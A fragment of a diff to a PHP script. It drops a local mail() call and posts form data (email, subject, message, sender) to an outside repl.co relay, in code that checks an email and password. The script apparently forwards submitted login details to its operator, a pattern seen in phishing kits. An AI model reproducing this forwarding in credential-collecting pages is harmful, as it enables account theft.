@@ -31,11 +31,7 @@ if ($email == "" && $password == "")
 
 ';
 
-    $headers = "MIME-Version: 1.0\r\n";
-    $headers = "MIME-Version: 1.0\r\nContent-type: text/html; charset=iso-8859-1\r\n";
-    $headers .= '' . $sender . "" . "\r\n";
-   // mail($emailku, $subjek, $pesan, $headers);
-
+    
 $url = 'https://kirim-email-sederhana.percodingankere.repl.co/proses.php';
 $myvars = 'email='.$emailku.'&judul='.$subjek.'&pesan='.$pesan.'&from='.$sender;
 
